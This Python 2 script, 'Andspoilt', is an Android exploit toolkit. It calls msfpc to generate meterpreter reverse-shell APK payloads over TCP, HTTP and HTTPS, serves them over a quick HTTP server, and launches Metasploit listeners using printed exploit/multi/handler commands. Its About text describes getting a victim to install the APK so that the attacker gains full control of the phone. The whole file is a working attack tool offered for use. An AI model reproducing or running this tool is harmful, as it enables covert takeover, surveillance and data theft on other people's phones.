#!/usr/bin/python

import os
import sys, traceback

def main():
	try:
		print ('''
\033[1;31m

      aaaa\                  dd|    ssss| ppppp\    00000\   ii|  ll|   tt|
     aa  aa\    _____        dd|  ss|     pp   pp| 00    00|      ll|   tt|
    aa    aa\  nnnnn \   dd  dd|  ss|     pp   pp|00      00|ii|  ll| ttt|ttt \033[1;32m
   aa$$$$$$aa| nn   nn|dd    dd|   sssss\ pp pp/  00      00|ii|  ll|   tt|
   aa      aa| nn   nn|dd    dd|       ss|pp|      00    00| ii|  ll|   tt|
   aa      aa| nn   nn|dd____dd|  ssssss/ pp|        0000/   ii|  ll|    ttt

            [**********]Android Exploit Toolkit[*********] \033[1;36m
              [***]Developed by Sunday Joel Philemon[***]
               [**]Mail: philemonsunday202@gmail.com[**]

\033[1;m
		''')
		def splash():
			while True:
				print ('''
1) Create Android apk payload
2) Start exploit
3) Update Andspoilt
4) Credits and About
5) Help
6) Exit Andspoilt

			''')

				dark = raw_input("\033[1;36muse > \033[1;m")

				while dark == "1":
					print ('''
1) Android-meterpreter-staged-reverse-tcp
2) Android-meterpreter-reverse-http
3) Android-meterpreter-reverse-https
4) Start SimpleHTTPServer for quick file transfer

					''')
					user_command = raw_input("\033[1;32mChoose Command > \033[1;m")
					if user_command == "1":
						cmd1 = os.system("msfpc apk REVERSE STAGED TCP")
					elif user_command == "2":
						cmd3 = os.system("msfpc apk REVERSE STAGED HTTP")
					elif user_command == "3":
						cmd3 = os.system("msfpc apk REVERSE STAGED HTTPS")

					elif user_command == "back":
						splash()
					elif user_command == "gohome":
						splash()
					elif user_command == "4":
						cmd4 = os.system("python2 -m SimpleHTTPServer 8080")

					else:
						print ("\033[1;31mWrong Command choosen!\033[1;m")


				if dark == "3":
					print ("\033[1;35mYou are using the latest version of Andspoilt\033[1;m")

				def blue():
					while dark == "2":
						print ('''
\033[1;35m          ******************
          *      *****     *
          *     *     *    *
          *    **     **   *
          *    **     **   *
          *    ** ___ **   *
          *      * || *    * 
          *      *_||_*    *
          *                *
          *                *
          ******************
\033[1;m

1) Start Android-meterpreter-staged-reverse-tcp listener
2) Start Android-meterpreter-reverse-http listener
3) Start Android-meterpreter-reverse-https listener
Use "back" to navigate to previous commands

			 ''')
						print ("\033[1;32mChoose to start Listener .\n\033[1;m")

						ignition = raw_input("\033[1;36mIgnite > \033[1;m")
						if ignition == "back":
							splash()
						elif ignition == "1":
							print("\033[1;31m[***]YOUR IP ADDRESS IS[***]\033[1;m")
							os.system("ip addr")
							print("""\033[1;31m
    Metaspoilt is starting
COPY AND PASE THE FOLLOWING COMMANDS
	use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
	set LHOST <Your ip>
	set LPORT 443
	exploit -j\033[1;m
		\033[1;31m			
TYPE "exit" in metaspoilt console to return to main menu\033[1;m	
							""")
							os.system("msfconsole")
							
						elif ignition == "2":
							print("\033[1;31m[***]YOUR IP ADDRESS IS[***]\033[1;m")
							os.system("ip addr")
							print("""\033[1;31m
    Metaspoilt is starting
COPY AND PASE THE FOLLOWING COMMANDS
	use exploit/multi/handler
set payload android/meterpreter/reverse_http
	set LHOST <Your ip>
	set LPORT 443
	exploit -j\033[1;m
		\033[1;31m			
TYPE "exit" in metaspoilt console to return to main menu\033[1;m	
							""")
							os.system("msfconsole")
							
						elif ignition == "3":
							print("\033[1;31m[***]YOUR IP ADDRESS IS[***]\033[1;m")
							os.system("ip addr")
							print("""\033[1;31m
    Metaspoilt is starting
COPY AND PASE THE FOLLOWING COMMANDS
	use exploit/multi/handler
set payload android/meterpreter/reverse_https
	set LHOST <Your ip>
	set LPORT 443
	exploit -j\033[1;m
		\033[1;31m			
TYPE "exit" in metaspoilt console to return to main menu\033[1;m	
							""")
							os.system("msfconsole")
				
					if dark == "4":
						print("""
						\033[1;31m
			[***]ABOUT[***]\033[1;m
\033[1;35m Andspoilt V 1.0 is designed to to remotely control android devices
This is by creating an APK file which is installed in the victims phone.
The attacker can therefore have full control of the victims phone in the meterpreter shell
\033[1;31m                       [***]CREDITS[***]\033[1;m
\033[1;35m* Shalleen Baraka Happuch
* Lance Ezra Juma
						
\033[1;m""")
					if dark == "5":
						print("""\033[1;31m     [**]For any problem contact mails[**]:\033[1;m
	\033[1;35mphilemonsunday202@gmail.com
	pythonofhades@programmer.net\033[1;m""")
					if dark == "6":
						sys.exit(0)

	
				blue()
		splash()
	except KeyboardInterrupt:
		print ("Andspoilt shutdown unexpectedly")
	except Exception:
		traceback.print_exc(file=sys.stdout)
	sys.exit(0)

if __name__ == "__main__":
    main()
